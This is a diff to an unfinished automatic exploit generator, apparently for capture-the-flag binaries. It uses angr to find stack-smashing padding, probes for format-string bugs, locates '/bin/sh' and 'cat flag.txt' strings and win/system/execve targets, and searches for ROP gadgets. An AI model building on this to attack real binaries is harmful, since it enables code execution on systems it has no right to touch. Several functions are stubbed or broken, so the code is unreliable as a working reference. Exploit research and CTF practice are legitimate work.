@@ -5,21 +5,23 @@ import argparse
 
 from pwn import *
 
+
 logging.getLogger("angr").setLevel(logging.CRITICAL)
 logging.getLogger("os").setLevel(logging.CRITICAL)
+logging.getLogger("pwnlib").setLevel(logging.CRITICAL)
 
 
 context.update(
     arch="amd64",
     endian="little",
-    log_level="info",
+    log_level="warning",
     os="linux",
     #terminal=["tmux", "split-window", "-h", "-p 65"]
     terminal=["st"]
 )
 
 # Important lists to use
-strings =  ["/bin/sh", "/bin/cat flag.txt", "flag.txt"]
+strings =  ["/bin/sh", "cat flag.txt", "flag.txt"]
 exploit_functions = ["win", "system", "execve", "syscall", "print_file"]
 arg_regs = ["rdi", "rsi", "rdx", "rcx", "r8", "r9"]
 useful_rop_functions = ["__libc_csu_init"]
@@ -33,10 +35,12 @@ class rAEG:
         #self.libc = context.binary = ELF(libc_path)
 
         self.rop_calls = []
+        self.exploit_function = None
 
         self.string_address = None
 
         self.got_overwrite_address = None
+        self.format_write = None
 
         self.canary = None
         self.canary_leak = None
@@ -62,12 +66,15 @@ class rAEG:
             for path in simgr.unconstrained:
                 path.add_constraints(path.regs.pc == b"CCCCCCCC")
                 if path.satisfiable():
-                    simgr.stashes["mem_corrupt"].append(path)
                     stack_smash = path.solver.eval(self.symbolic_input, cast_to=bytes)
-                    index = stack_smash.index(b"CCCCCCCC")
-                    self.symbolic_padding = stack_smash[:index]
-                    log.info(f"Found symbolic padding: {self.symbolic_padding}")
-                    log.info(f"Takes {len(self.symbolic_padding)} bytes to smash the instruction pointer")
+                    try:
+                        index = stack_smash.index(b"CCCCCCCC")
+                        self.symbolic_padding = stack_smash[:index]
+                        log.info(f"Found symbolic padding: {self.symbolic_padding}")
+                        log.info(f"Takes {len(self.symbolic_padding)} bytes to smash the instruction pointer")
+                        simgr.stashes["mem_corrupt"].append(path)
+                    except:
+                        print(stack_smash)
                 simgr.stashes["unconstrained"].remove(path)
                 simgr.drop(stash="active")
 
@@ -84,8 +91,6 @@ class rAEG:
             log.info("Successfully smashed the stack")
 
 
-        return self.symbolic_padding
-
 
     # Determine which exploit we need and return which type as a string
     # Also determine the parameters needed, and the function to execute
@@ -94,8 +99,9 @@ class rAEG:
         # First find if it is a format string vulnerability
         p = self.start_process(None)
         p.sendline(b"%p")
-        p.recvuntil(b"<<<")
+        #p.recvuntil(b"<<<")
         output = p.recvline()
+        logging.getLogger("pwnlib").setLevel(logging.INFO)
         if b":" in output:
             output = output.split(b":")[1]
 
@@ -103,7 +109,6 @@ class rAEG:
             log.info(f"[+] Found a format string vulnerability with {output}")
 
             # Check if win function
-
 
             # Check if pwnme symbol is present
 
@@ -113,7 +118,7 @@ class rAEG:
         #else:
         self.stack_smash()
 
-        # Find functions to use for exploit by enumerating through exploit functions
+
 
         # Find important string in the binary
         for s in strings:
@@ -123,11 +128,31 @@ class rAEG:
                 self.string_address = string_output[0]
                 log.info(f"Found string {s} at {self.string_address}")
                 break
-            # Set functions and parameters as a dictionary set
-        self.find_reg_gadget("rax")
-        self.find_reg_gadget("rdx")
-        self.find_reg_gadget("rsi")
-        self.find_write_gadget()
+
+        if self.string_address == None:
+            log.warning("Couldn't find any useful strings")
+
+        # Find functions to use for exploit by enumerating through exploit functions
+        for func in self.elf.sym:
+            if func == "win":
+                # Either ret2win, rop parameters, or format got overwrite
+                self.exploit_function = self.elf.sym["win"]
+                break
+            elif func == "system":
+                self.exploit_function = self.elf.sym["system"]
+                break
+            elif func == "execve":
+                self.exploit_function = self.elf.sym["execve"]
+                break
+            elif func == "syscall":
+                self.exploit_function = self.elf.sym["syscall"]
+                params = [self.string_address, ]
+                break
+
+        # Set functions and parameters as a dictionary set
+
+
+
 
         self.parameters = None
 
@@ -136,7 +161,7 @@ class rAEG:
 
     # Find gadget to control register
     def find_reg_gadget(self, register):
-        output = subprocess.check_output(["ROPgadget", "--binary", self.binary, "--re", f"pop {register}", "--filter", "jmp"]).split(b"\n")
+        output = subprocess.check_output(["ROPgadget", "--binary", self.binary, "--re", f"{register}", "--only", "pop|ret"]).split(b"\n")
 
         output.pop(0)
         output.pop(0)
@@ -145,6 +170,9 @@ class rAEG:
         output.pop(-1)
 
 
+        if len(output) <= 0:
+            log.info(f"Couldn't find gadget for {register}")
+            return None
         # Iterate through gadgets to find the one with the least instructions
         min_gadget = output[0]
         min_instructions = output[0].count(b";") + 1
@@ -154,7 +182,7 @@ class rAEG:
                 min_instruction = instructions
                 min_gadget = gadget
 
-        log.info(f"Found gadget: {min_gadget}")
+        logging.info(f"Found gadget for {register}: {min_gadget}")
         return None
 
 
@@ -188,6 +216,9 @@ class rAEG:
 
         # If there are no optimal gadgets choose from valid ones``
         if len(optimal_gadgets) <= 0:
+            if len(valid_gadgets) <= 0:
+                log.warning("Couldn't find write gadget")
+                return None
             optimal_gadgets = valid_gadgets
 
         # Find the gadget with the lowest amount of instructions
@@ -199,8 +230,7 @@ class rAEG:
                min_instructions = instructions
                min_gadget =  gadget
 
-        log.info(f"Found gadget: {min_gadget}")
-        print(output)
+        log.info(f"Found write primitive gadget: {min_gadget}")
         return None
 
     # Find writable address in binary
@@ -218,21 +248,38 @@ class rAEG:
 
         chain = b""
         # If it is a syscall add pop rax, 59 for execve
-        #if self.gadget_function == "syscall":
+        if function == "syscall":
+            pop_rax = find_reg_gadget("rax")
+            pops = pop_rax.count("pop")
+
+            #if pops > 1:
+
+            print(pop_rax)
+            print(pops)
             # Get pop rax gadget or another gadget to control rax
             #break
-        #for i in range(len(self.parameters)):
-
-        chain += p64(self.elf.sym[self.gadget_function])
+        for i in range(len(parameters)):
+            pop_reg = find_reg_gadget(regs[i])
+            pops = pop_reg.count("pop")
+            print(pop_reg)
+            print(pops)
+        chain += p64(self.elf.sym[function])
 
         return chain
 
 
     def generate_rop_chain(self):
+
+        if self.string_address == None:
+            #Perform a string write
+            #
+            write_gadget = find_write_gadget()
+
         return None
 
     def start_process(self, mode):
 
+        logging.getLogger("pwnlib").setLevel(logging.CRITICAL)
         gs = """
             init-pwndbg
         """
@@ -253,8 +300,6 @@ class rAEG:
         return None
 
     def exploit(self):
-
-
         p = self.start_process(None)
         if self.symbolic_padding != None:
             # Check if regular rop chain or libc leak
